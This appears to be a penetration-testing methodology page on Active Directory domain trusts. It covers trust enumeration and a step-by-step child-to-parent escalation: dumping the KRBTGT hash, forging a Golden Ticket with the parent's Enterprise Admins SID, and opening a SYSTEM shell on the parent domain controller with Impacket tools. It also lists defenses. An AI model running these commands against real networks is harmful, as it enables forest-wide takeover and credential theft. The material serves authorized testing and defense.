---
layout: page
title: "Domain Trusts"
subtitle: "Map how domains and forests trust each other, and abuse a parent-child trust"
permalink: /methodology/active-directory/domain-trusts/
---

A trust lets users in one domain access resources in another. Trusts decide how far a compromise travels. A user in a child domain may be able to reach the parent domain, and a foothold in one forest may reach a partner forest. Mapping trusts is the first step, and abusing a parent-child trust is the most direct route from one domain to the forest root. Trusts that cross forests are covered separately in [Cross-Forest Trust Abuse](/methodology/active-directory/cross-forest-trust-abuse/).

## Primer

Trust types:

| Type | Description |
|---|---|
| Parent-child | Two or more domains in one forest. Two-way and transitive. |
| Cross-link | A trust between child domains to speed up authentication |
| External | Non-transitive trust between domains in separate forests, with SID filtering |
| Tree-root | Two-way, transitive trust between a forest root and a new tree root |
| Forest | Transitive trust between two forest root domains |
| ESAE | A bastion forest used to manage AD |

Transitive trusts extend to any domain the trusted domain trusts. In a non-transitive trust, only the trusted domain itself is trusted. Forest, tree-root, parent-child, and cross-link trusts are transitive. External and custom trusts are typically non-transitive.

Direction matters too. In a one-way trust, users in the trusted domain can access resources in the trusting domain, but not the reverse. In a two-way trust, users from both domains can access the other.

It is common to find a Kerberoastable account in a partner domain that has admin rights in your principal domain.

## Workflow

1. Enumerate the trusts from the current domain: type, direction, and transitivity.
2. Enumerate the child domains, DCs, and the trusted domain's users.
3. Map the trusts in BloodHound and look for foreign group memberships.
4. For a parent-child trust, confirm the prerequisites for child-to-parent escalation.
5. Record every trust and its direction before testing any of them.

## Step 1: Enumerate trusts

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

`IntraForest` set to `True` means a parent-child or other trust inside the same forest. `ForestTransitive` set to `True` means a forest or external trust.

```powershell
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain CHILD_DOMAIN | select SamAccountName
```

The built-in `netdom` tool gives the same information without extra tools:

```cmd
netdom query /domain:DOMAIN trust
netdom query /domain:DOMAIN dc
netdom query /domain:DOMAIN workstation
```

BloodHound has a built-in query, "Map Domain Trust", that draws the same relationships.

## Child-to-parent escalation

If you control a child domain, you can forge a Golden Ticket that includes the SID of the parent domain's Enterprise Admins group in its extra SIDs. The parent domain trusts the ticket because the child is inside the same forest.

Prerequisites:

- Control of the child domain, with the child's KRBTGT NT hash
- The SID of the child domain
- The FQDN of the child domain
- The SID of the parent domain's Enterprise Admins group (the parent domain SID plus RID `519`)
- The name of any user. It does not need to exist in the child domain.

**Step 1: Get the KRBTGT hash.** Use DCSync from the child domain (see [DCSync](/methodology/active-directory/dcsync/)):

```bash
secretsdump.py CHILD_DOMAIN/USERNAME@CHILD_DC_IP -just-dc-user CHILD_DOMAIN/krbtgt
```

**Step 2: Find the SIDs.** Brute-force SIDs against each DC with `lookupsid.py`:

```bash
lookupsid.py CHILD_DOMAIN/USERNAME@CHILD_DC_IP | grep "Domain SID"
lookupsid.py CHILD_DOMAIN/USERNAME@PARENT_DC_IP | grep -B12 "Enterprise Admins"
```

**Step 3: Forge the ticket.** Use `ticketer.py` with the child domain SID and the parent's Enterprise Admins SID as an extra SID:

```bash
ticketer.py -nthash KRBTGT_HASH -domain CHILD_DOMAIN -domain-sid CHILD_DOMAIN_SID -extra-sid PARENT_DOMAIN_SID-519 hacker
export KRB5CCNAME=hacker.ccache
psexec.py CHILD_DOMAIN/hacker@PARENT_DC_HOST -k -no-pass -target-ip PARENT_DC_IP
```

The ticket is saved in `ccache` format, and `psexec.py` uses it to open a SYSTEM shell on the parent DC.

**Automated option.** Impacket's `raiseChild.py` performs the same steps in one command, including the shell:

```bash
raiseChild.py -target-exec PARENT_DC_IP CHILD_DOMAIN/USERNAME
```

## What to look for

- Trusts marked transitive that reach domains you have not yet tested
- Two-way trusts, which allow reverse access
- Child domain admins, which are the starting point for child-to-parent escalation
- Accounts from the trusted domain with privileged rights in your domain

## Pitfalls

- A child-to-parent attack is a Golden Ticket. It changes the parent domain's trust, so get written approval and record the forged ticket's lifetime.
- The KRBTGT hash is among the most sensitive values in the domain. Store it securely and destroy it after the engagement.
- The forged ticket names a user that does not exist. Record that name exactly, so defenders can match the activity to your test later.

## Defense

- Enable SID filtering on external trusts, and check that it stays on when a domain is migrated. The notes describe SID history abuse when filtering is not enabled.
- Remove unneeded trusts, and set one-way trusts where two-way trusts are not required.
- Review privileged accounts in child domains, since a child domain admin can escalate to the forest root.
- Rotate the KRBTGT password on a schedule, and after any suspected compromise.
